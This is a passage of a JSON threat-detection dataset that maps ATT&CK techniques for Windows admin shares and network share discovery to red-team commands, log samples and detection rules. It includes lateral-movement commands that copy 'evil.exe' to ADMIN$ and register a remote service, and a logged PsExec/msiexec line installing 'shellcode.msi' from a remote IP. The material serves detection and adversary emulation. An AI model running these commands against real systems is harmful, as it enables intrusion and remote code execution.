properly:\nsc \\\\COMP qc acachsrv\ndir \\\\COMP\\ADMIN$\\acachsrv.exe"}}, {"Atomic Red Team Test - Windows Admin Shares": {"attack_technique": "T1077", "display_name": "Windows Admin Shares", "atomic_tests": [{"name": "Map admin share", "description": "Connecting To Remote Shares\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Examples C$, IPC$, Admin$", "type": "String", "default": "C$"}, "user_name": {"description": "Username", "type": "String", "default": "DOMAIN\\Administrator"}, "password": {"description": "Password", "type": "String", "default": "P@ssw0rd1"}, "computer_name": {"description": "Target Computer Name", "type": "String", "default": "Target"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:#{user_name}\"\n"}}, {"name": "Map Admin Share PowerShell", "description": "Map Admin share utilizing PowerShell\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Examples C$, IPC$, Admin$", "type": "String", "default": "C$"}, "computer_name": {"description": "Target Computer Name", "type": "String", "default": "Target"}, "map_name": {"description": "Mapped Drive Letter", "type": "String", "default": "g"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n"}}, {"name": "Copy and Execute File with PsExec", "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n", "supported_platforms": ["windows"], "input_arguments": {"remote_host": {"description": "Remote computer to receive the copy and execute the file", "type": "String", "default": "\\\\localhost"}, "command_path": {"description": "File to copy and execute", "type": "Path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "psexec.exe #{remote_host} -c #{command_path}\n"}}, {"name": "Execute command writing output to local Admin Share", "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Remote computer to receive the copy and execute the file", "type": "String", "default": "output.txt"}, "command_to_execute": {"description": "Command to execute for output.", "type": "String", "default": "hostname"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n"}}]}}, {"Mitre Stockpile - Mounts a network file share on a target computer": {"id": "40161ad0-75bd-11e9-b475-0800200c9a66", "name": "Net use", "description": "Mounts a network file share on a target computer", "tactic": "lateral-movement", "technique": {"attack_id": "T1077", "name": "Windows Admin Shares"}, "platforms": {"windows": {"psh": {"command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n", "cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n"}}}}}, {"Mitre Stockpile - Mount a windows share": {"id": "aa6ec4dd-db09-4925-b9b9-43adeb154686", "name": "Mount Share", "description": "Mount a windows share", "tactic": "lateral-movement", "technique": {"attack_id": "T1077", "name": "Windows Admin Shares"}, "platforms": {"windows": {"psh": {"command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.not_exists": [{"source": "remote.host.fqdn", "edge": "has_share"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}]}}], "command_list": ["net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\nnet use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator (checking password reuse on local admin account)", "shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]", "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "cmd.exe /c \"net use \\\\#{computer_name}\\C$ #{password} /u:#{user_name}\"\n", "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:DOMAIN\\Administrator\"\n", "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} P@ssw0rd1 /u:#{user_name}\"\n", "cmd.exe /c \"net use \\\\Target\\#{share_name} #{password} /u:#{user_name}\"\n", "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\C$\n", "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\Target\\#{share_name}\n", "New-PSDrive -name g -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "psexec.exe \\\\localhost -c #{command_path}\n", "psexec.exe #{remote_host} -c C:\\Windows\\System32\\cmd.exe\n", "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n", "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n", {"windows": {"psh": {"command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n", "cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n"}}}, {"windows": {"psh": {"command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "Log\nwindows security log\nEventID: 4688\nProcess information:\nNew Process ID: 0xe84\nNew Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\ PsExec.exe\n\nEventID: 4688\nProcess information:\nNew Process ID: 0xfcc\nNew Process Name: C: \\ Windows \\ PSEXESVC.exe\n\nEVentID: 5140\nInternet Information:\nObject Type: File\nSource Address: fe80 :: 719e: d312: 648f: 4884\nSource Port: 49369\nShare information:\nShare name: \\\\ * \\ IPC $\n\nEventID: 5145\nInternet Information:\nObject Type: File\nSource Address: fe80 :: 719e: d312: 648f: 4884\nSource Port: 49369\n\nShare information:\nShare Name: \\\\ * \\ IPC $\nShare path:\nRelative Target Name: PSEXESVC\n\nSYSMON log\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15: 09: 29.237\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}\nProcessId: 3716\nImage: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\ PsExec.exe\nFileVersion: 2.2\nDescription: Execute processes remotely\nProduct: Sysinternals PsExec\nCompany: Sysinternals - www.sysinternals.com\nOriginalFileName: psexec.c\nCommandLine: PsExec.exe -d -s msiexec.exe / q / i http://192.168.126.146/shellcode.msi\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\nLogonId: 0x6e1ea\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = E50D9E3BD91908E13A26B3E23EDEAF577FB3A095\nParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}\nParentProcessId: 3492\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ System32 \\ cmd.exe\"\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15: 09: 29.284\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\nProcessId: 4044\nImage: C: \\ Windows \\ PSEXESVC.exe\nFileVersion: 2.2\nDescription: PsExec Service\nProduct: Sysinternals PsExec\nCompany: Sysinternals\nOriginalFileName: psexesvc.exe\nCommandLine: C: \\ Windows \\ PSEXESVC.exe\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: NT AUTHORITY \\ SYSTEM\nLogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1 = A17C21B909C56D93D978014E63FB06926EAEA8E7\nParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}\nParentProcessId: 496\nParentImage: C: \\ Windows \\ System32 \\ services.exe\nParentCommandLine: C: \\ Windows \\ system32 \\ services.exe\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15: 09: 29.440\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}\nProcessId: 1916\nImage: C: \\ Windows \\ System32 \\ msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: \"msiexec.exe\" / q / i http://192.168.126.146/shellcode.msi\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: NT AUTHORITY \\ SYSTEM\nLogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\nParentProcessId: 4044\nParentImage: C: \\ Windows \\ PSEXESVC.exe\nParentCommandLine: C: \\ Windows \\ PSEXESVC.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and process_path contains \"net.exe\"and (process_command_line contains \"use\"or process_command_line contains \"session\"or process_command_line contains \"file\")", "name": "Windows Admin Shares"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"powershell.exe\")and ((process_command_line contains \"*net* use*$\"or process_command_line contains \"*net* session*$\"or process_command_line contains \"*net* file*$\")or process_command_line contains \"*New-PSDrive*root*\")", "name": "Windows Admin Shares Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and process_path contains \"net.exe\"and process_command_line contains \"net share\"", "name": "Windows Admin Shares Process Created"}], "possible_detections": [{"data_source": {"title": "Access to ADMIN$ Share", "id": "098d7118-55bc-4912-a836-dc6483a8d150", "description": "Detects access to $ADMIN share", "tags": ["attack.lateral_movement", "attack.t1077"], "status": "experimental", "author": "Florian Roth", "logsource": {"product": "windows", "service": "security", "definition": "The advanced audit policy setting \"Object Access > Audit File Share\" must be configured for Success/Failure"}, "detection": {"selection": {"EventID": 5140, "ShareName": "Admin$"}, "filter": {"SubjectUserName": "*$"}, "condition": "selection and not filter"}, "falsepositives": ["Legitimate administrative activity"], "level": "low"}}, {"data_source": {"title": "First time seen remote named pipe", "id": "52d8b0c6-53d6-439a-9e41-52ad442ad9ad", "description": "This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes", "author": "Samir Bousseaden", "references": ["https://twitter.com/menasec1/status/1104489274387451904"], "tags": ["attack.lateral_movement", "attack.t1077"], "logsource": {"product": "windows", "service": "security", "description": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"}, "detection": {"selection1": {"EventID": 5145, "ShareName": "\\\\*\\IPC$"}, "selection2": {"EventID": 5145, "ShareName": "\\\\*\\IPC$", "RelativeTargetName": ["atsvc", "samr", "lsarpc", "winreg", "netlogon", "srvsvc", "protected_storage", "wkssvc", "browser", "netdfs"]}, "condition": "selection1 and not selection2"}, "falsepositives": ["update the excluded named pipe to filter out any newly observed legit named pipe"], "level": "high"}}, {"data_source": {"title": "Suspicious PsExec execution", "id": "c462f537-a1e3-41a6-b5fc-b2c2cef9bf82", "description": "detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one", "author": "Samir Bousseaden", "references": ["https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html"], "tags": ["attack.lateral_movement", "attack.t1077"], "logsource": {"product": "windows", "service": "security", "description": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"}, "detection": {"selection1": {"EventID": 5145, "ShareName": "\\\\*\\IPC$", "RelativeTargetName": ["*-stdin", "*-stdout", "*-stderr"]}, "selection2": {"EventID": 5145, "ShareName": "\\\\*\\IPC$", "RelativeTargetName": "PSEXESVC*"}, "condition": "selection1 and not selection2"}, "falsepositives": ["nothing observed so far"], "level": "high"}}]}, {"technique_id": "T1135", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net share", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net share", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "auxiliary/scanner/smb/smb_enumshares", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net view \\\\host /all [/domain:domain]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net view \\\\host /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "auxiliary/scanner/smb/smb_enumshares", "name": "Metasploit"}, {"source": "atomics/T1135/T1135.yaml", "command": "df -aH\nsmbutil view -g //computer1\nshowmount computer1\n", "name": null}, {"source": "atomics/T1135/T1135.yaml", "command": "net view \\\\localhost\n", "name": null}, {"source": "atomics/T1135/T1135.yaml", "command": "net view \\\\localhost\nget-smbshare -Name localhost\n", "name": null}, {"source": "atomics/T1135/T1135.yaml", "command": "net share\n", "name": null}, {"source": "data/abilities/discovery/530e47c6-8592-42bf-91df-c59ffbd8541b.yml", "command": {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "json_key": "Path", "json_type": ["str"]}]}}}}, "name": "Network Share Discovery"}, {"source": "data/abilities/discovery/deeac480-5c2a-42b5-90bb-41675ee53c7e.yml", "command": {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}, "name": "View the shares of a remote host"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_dfs_share", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_dfs_share", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/share_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/share_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_fileservers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_fileservers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/smb_mount", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/smb_mount", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net view \\\\ OWA2010SP3.0day.org\nIn the shared resource \\\\ OWA2010SP3.0day.org\n\n\n\nShare name for the type of use annotations\n\n-------------------------------------------------- -----------------------------\nAddress Disk \"Access to address objects\"\nCertEnroll Disk Active Directory Certificate Services Share\nExchangeOAB Disk OAB Distribution share\nGroupMetrics Disk group metrics MailTips publishing point\nNETLOGON Disk Logon server share\nSYSVOL Disk Logon server share\nThe command completed successfully.", "name": "Dos"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1135", "Built-in Windows Command": "net share", "Cobalt Strike": "net share", "Metasploit": "auxiliary/scanner/smb/smb_enumshares", "Description": "Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1135", "Built-in Windows Command": "net view \\\\host /all [/domain:domain]", "Cobalt Strike": "net view \\\\host /domain", "Metasploit": "auxiliary/scanner/smb/smb_enumshares", "Description": "Display the list of workstations and network devices on the network. "}}, {"Atomic Red Team Test - Network Share Discovery": {"attack_technique": "T1135", "display_name": "Network Share Discovery", "atomic_tests": [{"name": "Network Share Discovery", "description": "Network Share Discovery\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"computer_name": {"description": "Computer name to find a mount on.", "type": "string", "default": "computer1"}}, "executor": {"name": "sh", "command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n"}}, {"name": "Network Share Discovery command prompt", "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Computer name to find a mount on.", "type": "string", "default": "localhost"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "net view \\\\#{computer_name}\n"}}, {"name": "Network Share Discovery PowerShell", "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Computer name to find a mount on.", "type": "string", "default": "localhost"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "net view \\\\#{computer_name}\nget-smbshare -Name #{computer_name}\n"}}, {"name": "View available share drives", "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net share\n"}}]}}, {"Mitre Stockpile - Network Share Discovery": {"id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "name": "View admin shares", "description": "Network Share Discovery", "tactic": "discovery", "technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "platforms": {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "json_key": "Path", "json_type": ["str"]}]}}}}}}, {"Mitre Stockpile - View the shares of a remote host": {"id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "name": "View remote shares", "description": "View the shares of a remote host", "tactic": "discovery", "technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "platforms": {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_dfs_share", "ATT&CK Technique #1": "T1135", "ATT&CK Technique #2": "", "Technique": "Network Share Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_dfs_share\":  [\"T1135\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/share_finder", "ATT&CK Technique #1": "T1135", "ATT&CK Technique #2": "", "Technique": "Network Share Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/share_finder\":  [\"T1135\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_fileservers", "ATT&CK Technique #1": "T1135", "ATT&CK Technique #2": "", "Technique": "Network Share Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_fileservers\":  [\"T1135\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/smb_mount", "ATT&CK Technique #1": "T1135", "ATT&CK Technique #2": "", "Technique": "Network Share Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/smb_mount\":  [\"T1135\"],"}}], "command_list": ["net share", "net share", "auxiliary/scanner/smb/smb_enumshares", "net view \\\\host /all [/domain:domain]", "net view \\\\host /domain", "auxiliary/scanner/smb/smb_enumshares", "df -aH\nsmbutil view -g //computer1\nshowmount computer1\n", "net view \\\\localhost\n", "net view \\\\localhost\nget-smbshare -Name localhost\n", "net share\n", {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "json_key": "Path", "json_type": ["str"]}]}}}}, {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}, "powershell/situational_awareness/network/powerview/get_dfs_share", "powershell/situational_awareness/network/powerview/get_dfs_share", "powershell/situational_awareness/network/powerview/share_finder", "powershell/situational_awareness/network/powerview/share_finder", "python/situational_awareness/network/active_directory/get_fileservers", "python/situational_awareness/network/active_directory/get_fileservers", "python/situational_awareness/network/smb_mount", "python/situational_awareness/network/smb_mount", "Dos\nC: \\ Windows \\ system32> net view \\\\ OWA2010SP3.0day.org\nIn the shared resource \\\\ OWA2010SP3.0day.org\n\n\n\nShare name for the type of use annotations\n\n-------------------------------------------------- -----------------------------\nAddress Disk \"Access to address objects\"\nCertEnroll Disk Active Directory Certificate Services Share\nExchangeOAB Disk OAB Distribution share\nGroupMetrics Disk group metrics MailTips publishing point\nNETLOGON Disk Logon server share\nSYSVOL Disk Logon server share\nThe command completed successfully."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where process_path contains \"net.exe\"and (process_command_line contains \"view\"or process_command_line contains \"share\")", "name": "Network Share Discovery"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"and (process_command_line contains \"net view\"or process_command_line contains \"net share\"))or process_command_line contains \"get-smbshare -Name\"", "name": "Network Share Discovery Process"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows network share discovery (windows server 2016) Detection\ndescription: windows server 2016, windows server 2012, domain environment\ntags: T1135\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net view \\\\ * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # adjusted user rights. Note This event enabled more than 2016 windows server system\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5158 #Windows screening platform has been allowed to bind the local port. Note that the source port, protocol\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5156 #Windows screening platform has been allowed to connect.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Direction: Outbound network information #> Direction: Outbound\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # IP address of the host to initiate inquiry\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # 5158 and the same event source port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetaddress: * # destination IP address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetport: 445 # destination port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Agreement: * # protocol, the same protocol and 5158\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows network share discovery (windows server 2012) Detection\ndescription: windows server 2016, windows server 2012, domain environment\ntags: T1135\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5156 #Windows screening platform has been allowed to connect.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Direction: Inbound network information #> Direction: Inbound\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # queried host IP address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: 445\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetaddress: * # Destination Address IP address of the host to initiate queries\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetport: * # target host port IP port to initiate queries\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Agreement: * # protocol, the 5156 and 2016 events, 5158 incident involving a consensual agreement\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4702 # assigned special permissions for the new login.\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4624 # account was successfully logged.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0logontype: 3 # 3 type landing\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourcenetworkaddress: * # Network Information> source network address above 5156 target address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # Network Information> source network port above 5156 target port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Loginprocess: Kerberos # detailed authentication information> login process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Authenticationpackage: Kerberos # Detailed Authentication Information> Authentication Package\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5140 # visited network shared objects.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: file # Network Information> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # Network Information> source address above 5156 target address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # Network Information> source port destination port above 5156\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sharename: \\\\ * \\ IPC $ # Share Information> Share 